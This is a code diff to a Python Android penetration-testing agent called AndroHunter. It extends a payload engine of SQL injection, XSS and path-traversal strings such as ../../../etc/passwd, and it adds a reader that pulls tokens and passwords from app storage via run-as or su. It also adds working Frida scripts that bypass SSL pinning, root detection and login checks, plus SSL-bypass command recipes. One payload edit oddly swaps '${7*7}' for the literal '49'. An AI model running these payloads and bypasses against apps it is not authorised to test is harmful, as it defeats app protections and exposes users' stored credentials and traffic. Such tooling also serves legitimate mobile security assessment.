@@ -1367,9 +1367,9 @@ PAYLOAD_ENGINE = {
         "1 UNION SELECT null,null--", "' AND SLEEP(5)--", "admin'--", '" OR ""="',
     ],
     "xss": [
-        "<script>alert(1)</script>", '"><script>alert(1)</script>',
-        "javascript:alert(1)", "'><img src=x onerror=alert(1)>",
-        "${7*7}", "{{7*7}}",
+        "<script>alert(1)</script>", '"><img src=x onerror=alert(1)>',
+        "javascript:alert(1)", "'><svg onload=alert(1)>",
+        "49", "{{7*7}}",
     ],
     "lfi": [
         "../../../etc/passwd", "../../../../etc/shadow",
@@ -1524,17 +1524,22 @@ class AndroHunterAgent:
 
         return components
 
+    VULN_PATTERNS = {
+        "SQLi": ["sql", "syntax error", "mysql", "sqlite", "ora-", "sqlstate", "no such column"],
+        "XSS": ["<script>", "onerror=", "alert("],
+        "LFI": ["root:x:0:0", "/bin/bash", "php version"],
+        "Redirect": ["evil.com", "302", "301"],
+        "Template": ["49", "7777777"],
+        "CmdI": ["uid=", "gid=", "groups="],
+        "IDOR": ["user_id", "email", "token", "secret"],
+    }
+
     @staticmethod
     def _classify_response(category: str, result_text: str, logcat: str = "") -> str:
         """Classify fuzzing result as VULN / SUSP / SAFE (matches AndroHunter Payload Engine)."""
         combined = (result_text + " " + logcat).lower()
-        if category == "SQLi" and any(w in combined for w in ["sql", "syntax", "mysql", "sqlite", "no such column"]):
-            return "VULN"
-        if category == "XSS" and any(w in combined for w in ["<script>", "alert(", "onerror"]):
-            return "VULN"
-        if category == "LFI" and any(w in combined for w in ["root:x:0:0", "/bin/bash", "root:*:"]):
-            return "VULN"
-        if category == "Template" and "49" in combined:
+        patterns = AndroHunterAgent.VULN_PATTERNS.get(category, [])
+        if patterns and any(w in combined for w in patterns):
             return "VULN"
         if any(w in combined for w in ["exception", "crash", "died", "error"]):
             return "SUSP"
@@ -1954,6 +1959,541 @@ class AndroHunterAgent:
             "secrets_found": len(findings),
         }
 
+    # ── SharedPrefs Reader (matches AndroHunter SharedPrefsScreen) ──
+
+    SENSITIVE_KEYS = [
+        "token", "password", "passwd", "secret", "key", "auth", "session",
+        "credential", "api", "jwt", "bearer", "cookie", "hash", "pin", "code",
+    ]
+
+    async def read_shared_prefs(self, package: str,
+                                 progress_cb: Optional[Callable] = None) -> dict:
+        """Read SharedPreferences and flag entries with sensitive keys."""
+        if progress_cb:
+            await progress_cb("hunter", 10, "Reading SharedPreferences...")
+
+        prefs_list = await self._shell(f"run-as {package} ls shared_prefs/ 2>/dev/null")
+        if not prefs_list or "No such" in prefs_list or "not debuggable" in prefs_list.lower():
+            prefs_list = await self._shell(f"su 0 ls /data/data/{package}/shared_prefs/ 2>/dev/null")
+
+        entries = []
+        findings = []
+        files = [f.strip() for f in prefs_list.splitlines() if f.strip().endswith(".xml")]
+
+        for i, pf in enumerate(files[:20]):
+            if progress_cb:
+                await progress_cb("hunter", 10 + int((i / max(len(files), 1)) * 80), f"Reading {pf}...")
+
+            content = await self._shell(f"run-as {package} cat shared_prefs/{pf} 2>/dev/null")
+            if not content or "not debuggable" in content.lower():
+                content = await self._shell(f"su 0 cat /data/data/{package}/shared_prefs/{pf} 2>/dev/null")
+            if not content:
+                continue
+
+            for match in re.finditer(r'name="([^"]+)"[^>]*>([^<]*)<', content):
+                key, value = match.group(1), match.group(2).strip()
+                if not value:
+                    v_match = re.search(rf'name="{re.escape(key)}"[^>]*value="([^"]*)"', content)
+                    if v_match:
+                        value = v_match.group(1)
+                is_sens = any(sk in key.lower() for sk in self.SENSITIVE_KEYS)
+                entries.append({"file": pf, "key": key, "value": value[:300], "sensitive": is_sens})
+                if is_sens and value:
+                    findings.append({
+                        "severity": "HIGH",
+                        "category": "SharedPrefs/Sensitive Data",
+                        "title": f"Sensitive key '{key}' in {pf}",
+                        "description": f"Value: {value[:100]}",
+                        "evidence": f"[{pf}] {key}={value[:200]}",
+                        "recommendation": "Use EncryptedSharedPreferences or Android Keystore",
+                    })
+
+        return {
+            "success": True,
+            "findings": findings,
+            "entries": entries,
+            "files": files,
+            "total_entries": len(entries),
+            "sensitive_count": sum(1 for e in entries if e["sensitive"]),
+        }
+
+    # ── Manifest Viewer (matches AndroHunter ManifestViewerScreen) ──
+
+    DANGEROUS_PERMS = [
+        "CAMERA", "MICROPHONE", "LOCATION", "CONTACTS", "STORAGE", "PHONE",
+        "SMS", "RECORD_AUDIO", "ACCESSIBILITY", "BIND_", "INSTALL_PACKAGES",
+        "SYSTEM_ALERT",
+    ]
+
+    async def analyze_manifest(self, package: str,
+                                progress_cb: Optional[Callable] = None) -> dict:
+        """Analyze AndroidManifest components, permissions, and risk flags."""
+        if progress_cb:
+            await progress_cb("hunter", 10, "Dumping manifest...")
+
+        dump = await self._shell(f"dumpsys package {package}", timeout=15)
+        findings = []
+        components = []
+
+        is_debuggable = "DEBUGGABLE" in dump
+        allow_backup = "allowBackup=true" in dump
+        cleartext = "usesCleartextTraffic=true" in dump or "usesCleartextTraffic" not in dump
+
+        perms_out = await self._shell(f"dumpsys package {package} | grep 'android.permission'", timeout=10)
+        permissions = list({
+            line.strip().split(".")[-1]
+            for line in perms_out.splitlines()
+            if "android.permission" in line
+        })
+        dangerous_perms = [p for p in permissions if any(d in p.upper() for d in self.DANGEROUS_PERMS)]
+
+        for comp_type in ["activity", "service", "receiver", "provider"]:
+            section = await self._shell(
+                f"dumpsys package {package} | grep -A3 '{comp_type} '", timeout=10
+            )
+            for line in section.splitlines():
+                stripped = line.strip()
+                if package not in stripped:
+                    continue
+                name = ""
+                for part in stripped.split():
+                    if package in part:
+                        name = part.strip("{}[](),")
+                        break
+                if not name:
+                    continue
+                exported = "exported=true" in stripped
+                permission = None
+                perm_match = re.search(r'permission=([^\s]+)', stripped)
+                if perm_match:
+                    permission = perm_match.group(1)
+
+                if comp_type == "provider":
+                    severity = "HIGH" if exported and not permission else ("MEDIUM" if exported else "INFO")
+                else:
+                    severity = "HIGH" if exported and not permission else ("MEDIUM" if exported else "INFO")
+
+                components.append({
+                    "type": comp_type,
+                    "name": name.split(".")[-1] if "." in name else name,
+                    "full_name": name,
+                    "exported": exported,
+                    "permission": permission,
+                    "severity": severity,
+                })
+
+        exported_count = sum(1 for c in components if c["exported"])
+        risk_chips = []
+        if is_debuggable:
+            risk_chips.append({"label": "DEBUG", "severity": "CRITICAL"})
+            findings.append({
+                "severity": "CRITICAL", "category": "Manifest/Debug",
+                "title": "Application is debuggable",
+                "description": "android:debuggable=true allows attaching a debugger",
+                "recommendation": "Remove debuggable flag in release builds",
+            })
+        if allow_backup:
+            risk_chips.append({"label": "BACKUP", "severity": "HIGH"})
+            findings.append({
+                "severity": "HIGH", "category": "Manifest/Backup",
+                "title": "Application backup enabled",
+                "description": "android:allowBackup=true allows data extraction via adb backup",
+                "recommendation": "Set android:allowBackup='false'",
+            })
+        if exported_count > 3:
+            risk_chips.append({"label": f"{exported_count} EXPORTED", "severity": "HIGH"})
+        if len(dangerous_perms) > 5:
+            risk_chips.append({"label": f"{len(dangerous_perms)} DANGEROUS PERMS", "severity": "MEDIUM"})
+
+        for c in components:
+            if c["severity"] == "HIGH":
+                findings.append({
+                    "severity": "HIGH",
+                    "category": f"Manifest/Exported {c['type'].title()}",
+                    "title": f"Exported {c['type']} without permission: {c['name']}",
+                    "description": f"Full name: {c['full_name']}",
+                    "recommendation": "Add permission protection or set exported=false",
+                })
+
+        return {
+            "success": True,
+            "findings": findings,
+            "components": components,
+            "permissions": permissions,
+            "dangerous_perms": dangerous_perms,
+            "risk_chips": risk_chips,
+            "is_debuggable": is_debuggable,
+            "allow_backup": allow_backup,
+            "cleartext_traffic": cleartext,
+            "exported_count": exported_count,
+        }
+
+    # ── Activity Launcher (matches AndroHunter ActivityLauncherScreen) ──
+
+    async def list_activities(self, package: str,
+                               progress_cb: Optional[Callable] = None) -> dict:
+        """List all activities (exported and non-exported) with launch support."""
+        if progress_cb:
+            await progress_cb("hunter", 20, "Enumerating activities...")
+
+        dump = await self._shell(f"dumpsys package {package} | grep -E 'activity|Activity'", timeout=10)
+        activities = []
+        seen = set()
+        for line in dump.splitlines():
+            for part in line.strip().split():
+                if package in part:
+                    name = part.strip("{}[](),")
+                    if name and name not in seen and "/" not in name:
+                        exported = "exported=true" in line
+                        seen.add(name)
+                        activities.append({
+                            "name": name.split(".")[-1] if "." in name else name,
+                            "full_name": name,
+                            "exported": exported,
+                        })
+
+        return {"success": True, "activities": activities, "count": len(activities)}
+
+    async def launch_activity(self, package: str, activity: str,
+                               data_uri: str = "", extras: dict = None,
+                               progress_cb: Optional[Callable] = None) -> dict:
+        """Launch a specific activity with optional data URI and extras."""
+        comp = activity if "/" in activity else f"{package}/{activity}"
+        cmd_parts = ["am", "start", "-n", comp]
+        if data_uri:
+            cmd_parts += ["-d", f"'{data_uri}'"]
+        if extras:
+            for k, v in extras.items():
+                cmd_parts += ["--es", k, f"'{v}'"]
+
+        result = await self._shell(" ".join(cmd_parts), timeout=10)
+        success = "error" not in result.lower() or "starting" in result.lower()
+        return {
+            "success": success,
+            "command": " ".join(cmd_parts),
+            "output": result,
+        }
+
+    # ── Frida Script Generator (matches AndroHunter FridaGeneratorScreen) ──
+
+    FRIDA_TEMPLATES = {
+        "ssl_bypass": {
+            "name": "SSL Pinning Bypass",
+            "category": "SSL",
+            "desc": "Bypass OkHttp3 CertificatePinner, TrustManager, and Conscrypt",
+            "code": """Java.perform(function() {
+    try {
+        var CertPinning = Java.use('okhttp3.CertificatePinner');
+        CertPinning.check.overload('java.lang.String','java.util.List').implementation = function(a,b){ return; };
+        console.log('[+] OkHttp3 SSL bypass OK');
+    } catch(e){}
+    try {
+        var X509 = Java.use('javax.net.ssl.X509TrustManager');
+        var TrustManager = Java.registerClass({
+            name: 'com.bypass.TrustManager',
+            implements: [X509],
+            methods: {
+                checkClientTrusted: function(chain, authType){},
+                checkServerTrusted: function(chain, authType){},
+                getAcceptedIssuers: function(){ return []; }
+            }
+        });
+        var SSLContext = Java.use('javax.net.ssl.SSLContext');
+        var ctx = SSLContext.getInstance('TLS');
+        ctx.init(null, [TrustManager.$new()], null);
+        SSLContext.getDefault.implementation = function(){ return ctx; };
+        console.log('[+] TrustManager bypass OK');
+    } catch(e){}
+    try {
+        var nativeLib = Java.use('com.google.android.gms.org.conscrypt.TrustManagerImpl');
+        nativeLib.checkTrustedRecursive.implementation = function(a,b,c,d,e,f){ return []; };
+        console.log('[+] Conscrypt bypass OK');
+    } catch(e){}
+});""",
+        },
+        "root_bypass": {
+            "name": "Root Detection Bypass",
+            "category": "Root",
+            "desc": "Bypass RootBeer, SafetyNet, and file-based root checks",
+            "code": """Java.perform(function() {
+    try {
+        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
+        RootBeer.isRooted.implementation = function(){ return false; };
+        RootBeer.isRootedWithoutBusyBox.implementation = function(){ return false; };
+        console.log('[+] RootBeer bypass OK');
+    } catch(e){}
+    try {
+        var SafetyNet = Java.use('com.google.android.gms.safetynet.SafetyNetApi');
+        console.log('[+] SafetyNet hook attempted');
+    } catch(e){}
+    var File = Java.use('java.io.File');
+    File.exists.implementation = function() {
+        var path = this.getAbsolutePath();
+        var suspicious = ['/su','/magisk','/system/bin/su','/sbin/su'];
+        if(suspicious.some(function(p){ return path.includes(p); })) {
+            console.log('[!] Root file check blocked: ' + path);
+            return false;
+        }
+        return this.exists();
+    };
+    console.log('[+] File.exists hook OK');
+});""",
+        },
+        "login_bypass": {
+            "name": "Login Bypass",
+            "category": "Auth",
+            "desc": "Enumerate and hook auth/login/session classes to bypass authentication",
+            "code": """Java.perform(function() {{
+    try {{
+        Java.enumerateLoadedClasses({{
+            onMatch: function(name) {{
+                if(name.includes('{pkg}') &&
+                   (name.toLowerCase().includes('auth') ||
+                    name.toLowerCase().includes('login') ||
+                    name.toLowerCase().includes('session'))) {{
+                    console.log('[+] Auth class found: ' + name);
+                    try {{
+                        var clazz = Java.use(name);
+                        var methods = clazz.class.getDeclaredMethods();
+                        methods.forEach(function(m) {{
+                            if(m.getName().toLowerCase().includes('verify') ||
+                               m.getName().toLowerCase().includes('check') ||
+                               m.getName().toLowerCase().includes('valid')) {{
+                                console.log('    [>] Hooking: ' + m.getName());
+                            }}
+                        }});
+                    }} catch(e) {{}}
+                }}
+            }},
+            onComplete: function() {{}}
+        }});
+    }} catch(e){{ console.log('[-] ' + e); }}
+}});""",
+        },
+        "crypto_monitor": {
+            "name": "Crypto Monitor",
+            "category": "Crypto",
+            "desc": "Monitor Cipher.doFinal and Mac.doFinal calls with input/output",
+            "code": """Java.perform(function() {
+    var Cipher = Java.use('javax.crypto.Cipher');
+    Cipher.doFinal.overload('[B').implementation = function(data) {
+        console.log('[CRYPTO] doFinal input: ' +
+            Java.use('android.util.Base64').encodeToString(data, 0));
+        var result = this.doFinal(data);
+        console.log('[CRYPTO] doFinal output: ' +
+            Java.use('android.util.Base64').encodeToString(result, 0));
+        return result;
+    };
+    var Mac = Java.use('javax.crypto.Mac');
+    Mac.doFinal.overload().implementation = function() {
+        var result = this.doFinal();
+        console.log('[HMAC] ' + bytesToHex(result));
+        return result;
+    };
+    function bytesToHex(bytes) {
+        return Array.from(bytes).map(function(b){ return ('0' + (b & 0xFF).toString(16)).slice(-2); }).join('');
+    }
+    console.log('[+] Crypto monitor active');
+});""",
+        },
+        "sql_monitor": {
+            "name": "SQL Monitor",
+            "category": "SQL",
+            "desc": "Hook SQLiteDatabase rawQuery, execSQL, and query methods",
+            "code": """Java.perform(function() {
+    var DB = Java.use('android.database.sqlite.SQLiteDatabase');
+    DB.rawQuery.overload('java.lang.String','[Ljava.lang.String;').implementation = function(sql, args) {
+        console.log('[SQL] rawQuery: ' + sql);
+        if(args) console.log('  args: ' + args.join(', '));
+        return this.rawQuery(sql, args);
+    };
+    DB.execSQL.overload('java.lang.String').implementation = function(sql) {
+        console.log('[SQL] execSQL: ' + sql);
+        return this.execSQL(sql);
+    };
+    DB.query.overload('java.lang.String','[Ljava.lang.String;','java.lang.String','[Ljava.lang.String;','java.lang.String','java.lang.String','java.lang.String')
+        .implementation = function(table,cols,sel,selArgs,gb,having,ob) {
+            console.log('[SQL] query table=' + table + ' WHERE ' + sel);
+            return this.query(table,cols,sel,selArgs,gb,having,ob);
+        };
+    console.log('[+] SQL monitor active');
+});""",
+        },
+        "http_intercept": {
+            "name": "HTTP Intercept",
+            "category": "HTTP",
+            "desc": "Hook URL.openConnection and detect OkHttp/Retrofit/Volley frameworks",
+            "code": """Java.perform(function() {
+    try {
+        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
+        var Interceptor = Java.use('okhttp3.Interceptor');
+        console.log('[+] OkHttp3 found, hooking requests...');
+    } catch(e) {}
+    var URL = Java.use('java.net.URL');
+    URL.openConnection.overload().implementation = function() {
+        console.log('[HTTP] Connection to: ' + this.toString());
+        return this.openConnection();
+    };
+    Java.enumerateLoadedClasses({
+        onMatch: function(name) {
+            if(name.includes('okhttp3.Request') || name.includes('retrofit2')) {
+                console.log('[HTTP] Framework detected: ' + name);
+            }
+        },
+        onComplete: function(){}
+    });
+    console.log('[+] HTTP intercept active');
+});""",
+        },
+    }
+
+    SSL_BYPASS_METHODS = [
+        {
+            "name": "Frida SSL Kill Switch 2",
+            "desc": "Universal SSL pinning bypass via Frida codeshare",
+            "difficulty": "Easy",
+            "command": "frida --codeshare akabe4/frida-multiple-unpinning -U -f {pkg}",
+            "steps": [
+                "Install frida-tools: pip install frida-tools",
+                "Push frida-server to device",
+                "Run: frida --codeshare akabe4/frida-multiple-unpinning -U -f {pkg}",
+            ],
+        },
+        {
+            "name": "objection SSL Bypass",
+            "desc": "Bypass via objection REPL",
+            "difficulty": "Easy",
+            "command": "objection -g {pkg} explore --startup-command 'android sslpinning disable'",
+            "steps": [
+                "Install objection: pip install objection",
+                "Ensure frida-server is running",
+                "Run: objection -g {pkg} explore --startup-command 'android sslpinning disable'",
+            ],
+        },
+        {
+            "name": "Magisk TrustMeAlready",
+            "desc": "System-wide SSL bypass via Magisk module",
+            "difficulty": "Medium",
+            "command": "",
+            "steps": [
+                "Install Magisk on rooted device",
+                "Download TrustMeAlready module from Magisk repo",
+                "Enable module and reboot",
+            ],
+        },
+        {
+            "name": "Network Security Config",
+            "desc": "Patch APK network_security_config.xml to trust user CAs",
+            "difficulty": "Medium",
+            "command": "apktool d app.apk && apktool b app_patched -o patched.apk",
+            "steps": [
+                "Decompile APK: apktool d app.apk",
+                "Edit res/xml/network_security_config.xml to add <trust-anchors><certificates src='user'/></trust-anchors>",
+                "Rebuild: apktool b app_patched -o patched.apk",
+                "Sign: jarsigner or apksigner",
+            ],
+        },
+        {
+            "name": "Xposed SSLUnpinning",
+            "desc": "Use LSPosed + JustTrustMe for persistent bypass",
+            "difficulty": "Hard",
+            "command": "",
+            "steps": [
+                "Install LSPosed (Zygisk) on rooted device",
+                "Install JustTrustMe module",
+                "Enable for target app and reboot",
+            ],
+        },
+        {
+            "name": "Burp Proxy + User CA",
+            "desc": "Install Burp CA cert manually",
+            "difficulty": "Easy",
+            "command": "adb push burp.der /sdcard/ && adb shell am start -a android.settings.SECURITY_SETTINGS",
+            "steps": [
+                "Export Burp CA cert (DER format)",
+                "Push to device: adb push burp.der /sdcard/",
+                "Install: Settings → Security → Install from storage",
+                "Or use Traffic Inspector page for automated install",
+            ],
+        },
+    ]
+
+    def get_frida_templates(self, package: str = "") -> list[dict]:
+        """Return all Frida script templates, with package placeholder filled."""
+        result = []
+        for key, tpl in self.FRIDA_TEMPLATES.items():
+            code = tpl["code"].replace("{pkg}", package) if package else tpl["code"]
+            result.append({
+                "key": key,
+                "name": tpl["name"],
+                "category": tpl["category"],
+                "desc": tpl["desc"],
+                "code": code,
+            })
+        return result
+
+    def get_ssl_bypass_methods(self, package: str = "") -> list[dict]:
+        """Return all SSL bypass methods with package placeholder filled."""
+        return [
+            {**m, "command": m["command"].replace("{pkg}", package) if package else m["command"],
+             "steps": [s.replace("{pkg}", package) for s in m["steps"]] if package else m["steps"]}
+            for m in self.SSL_BYPASS_METHODS
+        ]
+
+    # ── Auto ADB Commands (matches AndroHunter AutoAdbScreen) ──
+
+    AUTO_ADB_COMMANDS = {
+        "App Info": [
+            ("Package info", "dumpsys package {pkg}"),
+            ("APK path", "pm path {pkg}"),
+            ("App permissions", "dumpsys package {pkg} | grep permission"),
+            ("Running processes", "ps -A | grep {pkg}"),
+            ("UID info", "dumpsys package {pkg} | grep userId"),
+        ],
+        "Storage": [
+            ("SharedPrefs files", "run-as {pkg} ls shared_prefs/ 2>/dev/null || su 0 ls /data/data/{pkg}/shared_prefs/"),
+            ("Databases", "run-as {pkg} ls databases/ 2>/dev/null || su 0 ls /data/data/{pkg}/databases/"),
+            ("Internal files", "run-as {pkg} ls files/ 2>/dev/null || su 0 ls /data/data/{pkg}/files/"),
+            ("External data", "ls /sdcard/Android/data/{pkg}/ 2>/dev/null"),
+            ("Cache", "run-as {pkg} ls cache/ 2>/dev/null"),
+        ],
+        "Network": [
+            ("Open connections", "netstat -tlnp 2>/dev/null || ss -tlnp"),
+            ("DNS servers", "getprop net.dns1 && getprop net.dns2"),
+            ("WiFi info", "dumpsys wifi | grep -i 'ssid\\|ip'"),
+            ("HTTP proxy", "settings get global http_proxy"),
+            ("Network security config", "dumpsys package {pkg} | grep -i network"),
+        ],
+        "Security": [
+            ("SELinux status", "getenforce"),
+            ("Root check", "which su 2>/dev/null && echo ROOTED || echo NOT_ROOTED"),
+            ("Debuggable?", "dumpsys package {pkg} | grep -i debug"),
+            ("Backup allowed?", "dumpsys package {pkg} | grep -i backup"),
+            ("Exported components", "dumpsys package {pkg} | grep exported=true"),
+        ],
+        "Logcat": [
+            ("Recent app logs", "logcat -d -t 50 | grep -i {pkg}"),
+            ("Errors only", "logcat -d -t 100 *:E | grep -i {pkg}"),
+            ("Clear logcat", "logcat -c"),
+        ],
+    }
+
+    async def run_auto_adb(self, package: str, command_template: str) -> dict:
+        """Run an ADB command with package placeholder replaced."""
+        cmd = command_template.replace("{pkg}", package)
+        result = await self._shell(cmd, timeout=15)
+        return {"success": True, "command": cmd, "output": result}
+
+    def get_auto_adb_commands(self, package: str = "") -> dict:
+        """Return organized ADB command categories."""
+        result = {}
+        for cat, cmds in self.AUTO_ADB_COMMANDS.items():
+            result[cat] = [
+                {"label": label, "command": cmd.replace("{pkg}", package) if package else cmd}
+                for label, cmd in cmds
+            ]
+        return result
+
     async def full_hunt(self, package: str, apk_path: str = None,
                          progress_cb: Optional[Callable] = None) -> dict:
         """Run all AndroHunter modules on a package."""
@@ -1969,6 +2509,8 @@ class AndroHunterAgent:
             ("provider_fuzzer", lambda: self.fuzz_providers(package, sub_progress)),
             ("broadcast_fuzzer", lambda: self.fuzz_broadcasts(package, sub_progress)),
             ("task_hijack", lambda: self.check_task_hijack(package, sub_progress)),
+            ("shared_prefs", lambda: self.read_shared_prefs(package, sub_progress)),
+            ("manifest", lambda: self.analyze_manifest(package, sub_progress)),
         ]
 
         if apk_path and os.path.exists(apk_path):
@@ -2057,7 +2599,12 @@ class AgentManager:
                 "icon": "crosshair",
                 "installed": True,
                 "version": "built-in",
-                "description": "AndroHunter – Intent/Provider/Broadcast fuzzing, FileProvider analysis, StrandHogg, DEX secrets",
-                "capabilities": ["intent_fuzzer", "provider_fuzzer", "broadcast_fuzzer", "fileprovider_analyzer", "task_hijack", "dex_secrets"],
+                "description": "AndroHunter – 12 modules: Intent/Provider/Broadcast fuzzing, FileProvider, StrandHogg, DEX secrets, SharedPrefs, Manifest, Frida Gen, SSL Bypass, Activity Launcher, Auto ADB",
+                "capabilities": [
+                    "intent_fuzzer", "provider_fuzzer", "broadcast_fuzzer",
+                    "fileprovider_analyzer", "task_hijack", "dex_secrets",
+                    "shared_prefs_reader", "manifest_viewer", "frida_generator",
+                    "ssl_bypass_guide", "activity_launcher", "auto_adb",
+                ],
             },
         ]
